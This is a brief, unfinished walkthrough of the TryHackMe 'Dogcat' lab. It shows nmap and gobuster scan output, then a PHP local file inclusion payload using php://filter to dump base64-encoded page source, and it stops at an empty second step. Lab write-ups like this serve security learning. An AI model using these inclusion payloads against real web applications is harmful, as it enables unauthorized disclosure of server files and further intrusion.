#  TryHackMe -  Dogcat
##  IP : 10.10.199.21
##  Walkthrough by 
```
Shaswata Saha
16-07-23
12:12AM
```

>   nmap scan
```bash

# Nmap 7.92 scan initiated Wed Jun 21 17:06:06 2023 as: nmap -oN nmap.txt -oC -sC 10.10.199.21
Nmap scan report for 10.10.199.21
Host is up (0.24s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
22/tcp   open     ssh
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
1074/tcp filtered warmspotMgmt
9090/tcp filtered zeus-admin

# Nmap done at Wed Jun 21 17:06:48 2023 -- 1 IP address (1 host up) scanned in 41.14 seconds

```

>   Gobuster Scan
```bash
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.199.21
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Documents/gobuster-wordlist/dsstorewordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/21 17:07:05 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 418]
/.htaccess            (Status: 403) [Size: 277]
/dogs                 (Status: 301) [Size: 311] [--> http://10.10.199.21/dogs/]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
Progress: 1824 / 1829 (99.73%)
===============================================================
2023/06/21 17:07:49 Finished

```

##  IP change = 10.10.16.20

##  Steps :
1.  Using a php inclusion technique with php://filter
```bash
http://10.10.16.20/?view=php://filter/convert.base64-encode/resource=dog
```

We get:
```
PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K
```

```bash
http://10.10.16.20/?view=php://filter/convert.base64-encode/resource=cat
```

We get:
```
PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K 
```

2.  
